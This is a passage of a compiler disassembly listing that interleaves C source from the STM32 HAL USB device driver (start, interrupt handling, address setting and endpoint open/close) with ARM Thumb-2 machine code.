 800206c:	4618      	mov	r0, r3
 800206e:	3714      	adds	r7, #20
 8002070:	46bd      	mov	sp, r7
 8002072:	bdf0      	pop	{r4, r5, r6, r7, pc}

08002074 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8002074:	b580      	push	{r7, lr}
 8002076:	b082      	sub	sp, #8
 8002078:	af00      	add	r7, sp, #0
 800207a:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 800207c:	687b      	ldr	r3, [r7, #4]
 800207e:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002082:	2b01      	cmp	r3, #1
 8002084:	d101      	bne.n	800208a <HAL_PCD_Start+0x16>
 8002086:	2302      	movs	r3, #2
 8002088:	e012      	b.n	80020b0 <HAL_PCD_Start+0x3c>
 800208a:	687b      	ldr	r3, [r7, #4]
 800208c:	2201      	movs	r2, #1
 800208e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8002092:	687b      	ldr	r3, [r7, #4]
 8002094:	681b      	ldr	r3, [r3, #0]
 8002096:	4618      	mov	r0, r3
 8002098:	f003 ffc2 	bl	8006020 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 800209c:	687b      	ldr	r3, [r7, #4]
 800209e:	681b      	ldr	r3, [r3, #0]
 80020a0:	4618      	mov	r0, r3
 80020a2:	f006 faaa 	bl	80085fa <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 80020a6:	687b      	ldr	r3, [r7, #4]
 80020a8:	2200      	movs	r2, #0
 80020aa:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020ae:	2300      	movs	r3, #0
}
 80020b0:	4618      	mov	r0, r3
 80020b2:	3708      	adds	r7, #8
 80020b4:	46bd      	mov	sp, r7
 80020b6:	bd80      	pop	{r7, pc}

080020b8 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 80020b8:	b580      	push	{r7, lr}
 80020ba:	b084      	sub	sp, #16
 80020bc:	af00      	add	r7, sp, #0
 80020be:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 80020c0:	687b      	ldr	r3, [r7, #4]
 80020c2:	681b      	ldr	r3, [r3, #0]
 80020c4:	4618      	mov	r0, r3
 80020c6:	f006 fac4 	bl	8008652 <USB_ReadInterrupts>
 80020ca:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 80020cc:	68fb      	ldr	r3, [r7, #12]
 80020ce:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80020d2:	2b00      	cmp	r3, #0
 80020d4:	d003      	beq.n	80020de <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 80020d6:	6878      	ldr	r0, [r7, #4]
 80020d8:	f000 fb59 	bl	800278e <PCD_EP_ISR_Handler>

    return;
 80020dc:	e110      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 80020de:	68fb      	ldr	r3, [r7, #12]
 80020e0:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80020e4:	2b00      	cmp	r3, #0
 80020e6:	d013      	beq.n	8002110 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 80020e8:	687b      	ldr	r3, [r7, #4]
 80020ea:	681b      	ldr	r3, [r3, #0]
 80020ec:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020f0:	b29a      	uxth	r2, r3
 80020f2:	687b      	ldr	r3, [r7, #4]
 80020f4:	681b      	ldr	r3, [r3, #0]
 80020f6:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 80020fa:	b292      	uxth	r2, r2
 80020fc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8002100:	6878      	ldr	r0, [r7, #4]
 8002102:	f00a fd4c 	bl	800cb9e <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8002106:	2100      	movs	r1, #0
 8002108:	6878      	ldr	r0, [r7, #4]
 800210a:	f000 f8fc 	bl	8002306 <HAL_PCD_SetAddress>

    return;
 800210e:	e0f7      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8002110:	68fb      	ldr	r3, [r7, #12]
 8002112:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002116:	2b00      	cmp	r3, #0
 8002118:	d00c      	beq.n	8002134 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 800211a:	687b      	ldr	r3, [r7, #4]
 800211c:	681b      	ldr	r3, [r3, #0]
 800211e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002122:	b29a      	uxth	r2, r3
 8002124:	687b      	ldr	r3, [r7, #4]
 8002126:	681b      	ldr	r3, [r3, #0]
 8002128:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 800212c:	b292      	uxth	r2, r2
 800212e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002132:	e0e5      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8002134:	68fb      	ldr	r3, [r7, #12]
 8002136:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 800213a:	2b00      	cmp	r3, #0
 800213c:	d00c      	beq.n	8002158 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 800213e:	687b      	ldr	r3, [r7, #4]
 8002140:	681b      	ldr	r3, [r3, #0]
 8002142:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002146:	b29a      	uxth	r2, r3
 8002148:	687b      	ldr	r3, [r7, #4]
 800214a:	681b      	ldr	r3, [r3, #0]
 800214c:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8002150:	b292      	uxth	r2, r2
 8002152:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002156:	e0d3      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8002158:	68fb      	ldr	r3, [r7, #12]
 800215a:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 800215e:	2b00      	cmp	r3, #0
 8002160:	d034      	beq.n	80021cc <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8002162:	687b      	ldr	r3, [r7, #4]
 8002164:	681b      	ldr	r3, [r3, #0]
 8002166:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800216a:	b29a      	uxth	r2, r3
 800216c:	687b      	ldr	r3, [r7, #4]
 800216e:	681b      	ldr	r3, [r3, #0]
 8002170:	f022 0204 	bic.w	r2, r2, #4
 8002174:	b292      	uxth	r2, r2
 8002176:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 800217a:	687b      	ldr	r3, [r7, #4]
 800217c:	681b      	ldr	r3, [r3, #0]
 800217e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002182:	b29a      	uxth	r2, r3
 8002184:	687b      	ldr	r3, [r7, #4]
 8002186:	681b      	ldr	r3, [r3, #0]
 8002188:	f022 0208 	bic.w	r2, r2, #8
 800218c:	b292      	uxth	r2, r2
 800218e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8002192:	687b      	ldr	r3, [r7, #4]
 8002194:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002198:	2b01      	cmp	r3, #1
 800219a:	d107      	bne.n	80021ac <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 800219c:	687b      	ldr	r3, [r7, #4]
 800219e:	2200      	movs	r2, #0
 80021a0:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 80021a4:	2100      	movs	r1, #0
 80021a6:	6878      	ldr	r0, [r7, #4]
 80021a8:	f00a ffd6 	bl	800d158 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 80021ac:	6878      	ldr	r0, [r7, #4]
 80021ae:	f00a fd2f 	bl	800cc10 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 80021b2:	687b      	ldr	r3, [r7, #4]
 80021b4:	681b      	ldr	r3, [r3, #0]
 80021b6:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80021ba:	b29a      	uxth	r2, r3
 80021bc:	687b      	ldr	r3, [r7, #4]
 80021be:	681b      	ldr	r3, [r3, #0]
 80021c0:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 80021c4:	b292      	uxth	r2, r2
 80021c6:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80021ca:	e099      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 80021cc:	68fb      	ldr	r3, [r7, #12]
 80021ce:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80021d2:	2b00      	cmp	r3, #0
 80021d4:	d027      	beq.n	8002226 <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 80021d6:	687b      	ldr	r3, [r7, #4]
 80021d8:	681b      	ldr	r3, [r3, #0]
 80021da:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021de:	b29a      	uxth	r2, r3
 80021e0:	687b      	ldr	r3, [r7, #4]
 80021e2:	681b      	ldr	r3, [r3, #0]
 80021e4:	f042 0208 	orr.w	r2, r2, #8
 80021e8:	b292      	uxth	r2, r2
 80021ea:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 80021ee:	687b      	ldr	r3, [r7, #4]
 80021f0:	681b      	ldr	r3, [r3, #0]
 80021f2:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80021f6:	b29a      	uxth	r2, r3
 80021f8:	687b      	ldr	r3, [r7, #4]
 80021fa:	681b      	ldr	r3, [r3, #0]
 80021fc:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8002200:	b292      	uxth	r2, r2
 8002202:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002206:	687b      	ldr	r3, [r7, #4]
 8002208:	681b      	ldr	r3, [r3, #0]
 800220a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800220e:	b29a      	uxth	r2, r3
 8002210:	687b      	ldr	r3, [r7, #4]
 8002212:	681b      	ldr	r3, [r3, #0]
 8002214:	f042 0204 	orr.w	r2, r2, #4
 8002218:	b292      	uxth	r2, r2
 800221a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 800221e:	6878      	ldr	r0, [r7, #4]
 8002220:	f00a fcdc 	bl	800cbdc <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002224:	e06c      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8002226:	68fb      	ldr	r3, [r7, #12]
 8002228:	f003 0380 	and.w	r3, r3, #128	; 0x80
 800222c:	2b00      	cmp	r3, #0
 800222e:	d040      	beq.n	80022b2 <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8002230:	687b      	ldr	r3, [r7, #4]
 8002232:	681b      	ldr	r3, [r3, #0]
 8002234:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002238:	b29a      	uxth	r2, r3
 800223a:	687b      	ldr	r3, [r7, #4]
 800223c:	681b      	ldr	r3, [r3, #0]
 800223e:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8002242:	b292      	uxth	r2, r2
 8002244:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8002248:	687b      	ldr	r3, [r7, #4]
 800224a:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 800224e:	2b00      	cmp	r3, #0
 8002250:	d12b      	bne.n	80022aa <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002252:	687b      	ldr	r3, [r7, #4]
 8002254:	681b      	ldr	r3, [r3, #0]
 8002256:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800225a:	b29a      	uxth	r2, r3
 800225c:	687b      	ldr	r3, [r7, #4]
 800225e:	681b      	ldr	r3, [r3, #0]
 8002260:	f042 0204 	orr.w	r2, r2, #4
 8002264:	b292      	uxth	r2, r2
 8002266:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 800226a:	687b      	ldr	r3, [r7, #4]
 800226c:	681b      	ldr	r3, [r3, #0]
 800226e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002272:	b29a      	uxth	r2, r3
 8002274:	687b      	ldr	r3, [r7, #4]
 8002276:	681b      	ldr	r3, [r3, #0]
 8002278:	f042 0208 	orr.w	r2, r2, #8
 800227c:	b292      	uxth	r2, r2
 800227e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 8002282:	687b      	ldr	r3, [r7, #4]
 8002284:	2201      	movs	r2, #1
 8002286:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 800228a:	687b      	ldr	r3, [r7, #4]
 800228c:	681b      	ldr	r3, [r3, #0]
 800228e:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8002292:	b29b      	uxth	r3, r3
 8002294:	089b      	lsrs	r3, r3, #2
 8002296:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 800229a:	687b      	ldr	r3, [r7, #4]
 800229c:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 80022a0:	2101      	movs	r1, #1
 80022a2:	6878      	ldr	r0, [r7, #4]
 80022a4:	f00a ff58 	bl	800d158 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 80022a8:	e02a      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 80022aa:	6878      	ldr	r0, [r7, #4]
 80022ac:	f00a fc96 	bl	800cbdc <HAL_PCD_SuspendCallback>
    return;
 80022b0:	e026      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 80022b2:	68fb      	ldr	r3, [r7, #12]
 80022b4:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80022b8:	2b00      	cmp	r3, #0
 80022ba:	d00f      	beq.n	80022dc <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 80022bc:	687b      	ldr	r3, [r7, #4]
 80022be:	681b      	ldr	r3, [r3, #0]
 80022c0:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80022c4:	b29a      	uxth	r2, r3
 80022c6:	687b      	ldr	r3, [r7, #4]
 80022c8:	681b      	ldr	r3, [r3, #0]
 80022ca:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 80022ce:	b292      	uxth	r2, r2
 80022d0:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 80022d4:	6878      	ldr	r0, [r7, #4]
 80022d6:	f00a fc54 	bl	800cb82 <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 80022da:	e011      	b.n	8002300 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 80022dc:	68fb      	ldr	r3, [r7, #12]
 80022de:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80022e2:	2b00      	cmp	r3, #0
 80022e4:	d00c      	beq.n	8002300 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 80022e6:	687b      	ldr	r3, [r7, #4]
 80022e8:	681b      	ldr	r3, [r3, #0]
 80022ea:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80022ee:	b29a      	uxth	r2, r3
 80022f0:	687b      	ldr	r3, [r7, #4]
 80022f2:	681b      	ldr	r3, [r3, #0]
 80022f4:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 80022f8:	b292      	uxth	r2, r2
 80022fa:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80022fe:	bf00      	nop
  }
}
 8002300:	3710      	adds	r7, #16
 8002302:	46bd      	mov	sp, r7
 8002304:	bd80      	pop	{r7, pc}

08002306 <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 8002306:	b580      	push	{r7, lr}
 8002308:	b082      	sub	sp, #8
 800230a:	af00      	add	r7, sp, #0
 800230c:	6078      	str	r0, [r7, #4]
 800230e:	460b      	mov	r3, r1
 8002310:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002312:	687b      	ldr	r3, [r7, #4]
 8002314:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002318:	2b01      	cmp	r3, #1
 800231a:	d101      	bne.n	8002320 <HAL_PCD_SetAddress+0x1a>
 800231c:	2302      	movs	r3, #2
 800231e:	e013      	b.n	8002348 <HAL_PCD_SetAddress+0x42>
 8002320:	687b      	ldr	r3, [r7, #4]
 8002322:	2201      	movs	r2, #1
 8002324:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 8002328:	687b      	ldr	r3, [r7, #4]
 800232a:	78fa      	ldrb	r2, [r7, #3]
 800232c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 8002330:	687b      	ldr	r3, [r7, #4]
 8002332:	681b      	ldr	r3, [r3, #0]
 8002334:	78fa      	ldrb	r2, [r7, #3]
 8002336:	4611      	mov	r1, r2
 8002338:	4618      	mov	r0, r3
 800233a:	f006 f94a 	bl	80085d2 <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 800233e:	687b      	ldr	r3, [r7, #4]
 8002340:	2200      	movs	r2, #0
 8002342:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002346:	2300      	movs	r3, #0
}
 8002348:	4618      	mov	r0, r3
 800234a:	3708      	adds	r7, #8
 800234c:	46bd      	mov	sp, r7
 800234e:	bd80      	pop	{r7, pc}

08002350 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002350:	b580      	push	{r7, lr}
 8002352:	b084      	sub	sp, #16
 8002354:	af00      	add	r7, sp, #0
 8002356:	6078      	str	r0, [r7, #4]
 8002358:	4608      	mov	r0, r1
 800235a:	4611      	mov	r1, r2
 800235c:	461a      	mov	r2, r3
 800235e:	4603      	mov	r3, r0
 8002360:	70fb      	strb	r3, [r7, #3]
 8002362:	460b      	mov	r3, r1
 8002364:	803b      	strh	r3, [r7, #0]
 8002366:	4613      	mov	r3, r2
 8002368:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 800236a:	2300      	movs	r3, #0
 800236c:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 800236e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002372:	2b00      	cmp	r3, #0
 8002374:	da0e      	bge.n	8002394 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002376:	78fb      	ldrb	r3, [r7, #3]
 8002378:	f003 0307 	and.w	r3, r3, #7
 800237c:	1c5a      	adds	r2, r3, #1
 800237e:	4613      	mov	r3, r2
 8002380:	009b      	lsls	r3, r3, #2
 8002382:	4413      	add	r3, r2
 8002384:	00db      	lsls	r3, r3, #3
 8002386:	687a      	ldr	r2, [r7, #4]
 8002388:	4413      	add	r3, r2
 800238a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800238c:	68fb      	ldr	r3, [r7, #12]
 800238e:	2201      	movs	r2, #1
 8002390:	705a      	strb	r2, [r3, #1]
 8002392:	e00e      	b.n	80023b2 <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002394:	78fb      	ldrb	r3, [r7, #3]
 8002396:	f003 0207 	and.w	r2, r3, #7
 800239a:	4613      	mov	r3, r2
 800239c:	009b      	lsls	r3, r3, #2
 800239e:	4413      	add	r3, r2
 80023a0:	00db      	lsls	r3, r3, #3
 80023a2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023a6:	687a      	ldr	r2, [r7, #4]
 80023a8:	4413      	add	r3, r2
 80023aa:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023ac:	68fb      	ldr	r3, [r7, #12]
 80023ae:	2200      	movs	r2, #0
 80023b0:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 80023b2:	78fb      	ldrb	r3, [r7, #3]
 80023b4:	f003 0307 	and.w	r3, r3, #7
 80023b8:	b2da      	uxtb	r2, r3
 80023ba:	68fb      	ldr	r3, [r7, #12]
 80023bc:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 80023be:	883a      	ldrh	r2, [r7, #0]
 80023c0:	68fb      	ldr	r3, [r7, #12]
 80023c2:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 80023c4:	68fb      	ldr	r3, [r7, #12]
 80023c6:	78ba      	ldrb	r2, [r7, #2]
 80023c8:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 80023ca:	78bb      	ldrb	r3, [r7, #2]
 80023cc:	2b02      	cmp	r3, #2
 80023ce:	d102      	bne.n	80023d6 <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 80023d0:	68fb      	ldr	r3, [r7, #12]
 80023d2:	2200      	movs	r2, #0
 80023d4:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 80023d6:	687b      	ldr	r3, [r7, #4]
 80023d8:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023dc:	2b01      	cmp	r3, #1
 80023de:	d101      	bne.n	80023e4 <HAL_PCD_EP_Open+0x94>
 80023e0:	2302      	movs	r3, #2
 80023e2:	e00e      	b.n	8002402 <HAL_PCD_EP_Open+0xb2>
 80023e4:	687b      	ldr	r3, [r7, #4]
 80023e6:	2201      	movs	r2, #1
 80023e8:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 80023ec:	687b      	ldr	r3, [r7, #4]
 80023ee:	681b      	ldr	r3, [r3, #0]
 80023f0:	68f9      	ldr	r1, [r7, #12]
 80023f2:	4618      	mov	r0, r3
 80023f4:	f003 fe8c 	bl	8006110 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 80023f8:	687b      	ldr	r3, [r7, #4]
 80023fa:	2200      	movs	r2, #0
 80023fc:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002400:	7afb      	ldrb	r3, [r7, #11]
}
 8002402:	4618      	mov	r0, r3
 8002404:	3710      	adds	r7, #16
 8002406:	46bd      	mov	sp, r7
 8002408:	bd80      	pop	{r7, pc}

0800240a <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800240a:	b580      	push	{r7, lr}
 800240c:	b084      	sub	sp, #16
 800240e:	af00      	add	r7, sp, #0
 8002410:	6078      	str	r0, [r7, #4]
 8002412:	460b      	mov	r3, r1
 8002414:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002416:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800241a:	2b00      	cmp	r3, #0
 800241c:	da0e      	bge.n	800243c <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800241e:	78fb      	ldrb	r3, [r7, #3]
 8002420:	f003 0307 	and.w	r3, r3, #7
 8002424:	1c5a      	adds	r2, r3, #1
 8002426:	4613      	mov	r3, r2
 8002428:	009b      	lsls	r3, r3, #2
 800242a:	4413      	add	r3, r2
 800242c:	00db      	lsls	r3, r3, #3
 800242e:	687a      	ldr	r2, [r7, #4]
 8002430:	4413      	add	r3, r2
 8002432:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002434:	68fb      	ldr	r3, [r7, #12]
 8002436:	2201      	movs	r2, #1
 8002438:	705a      	strb	r2, [r3, #1]
 800243a:	e00e      	b.n	800245a <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800243c:	78fb      	ldrb	r3, [r7, #3]
 800243e:	f003 0207 	and.w	r2, r3, #7
 8002442:	4613      	mov	r3, r2
 8002444:	009b      	lsls	r3, r3, #2
 8002446:	4413      	add	r3, r2
 8002448:	00db      	lsls	r3, r3, #3
 800244a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800244e:	687a      	ldr	r2, [r7, #4]
 8002450:	4413      	add	r3, r2
 8002452:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002454:	68fb      	ldr	r3, [r7, #12]
 8002456:	2200      	movs	r2, #0
 8002458:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 800245a:	78fb      	ldrb	r3, [r7, #3]
 800245c:	f003 0307 	and.w	r3, r3, #7
 8002460:	b2da      	uxtb	r2, r3
 8002462:	68fb      	ldr	r3, [r7, #12]
 8002464:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002466:	687b      	ldr	r3, [r7, #4]
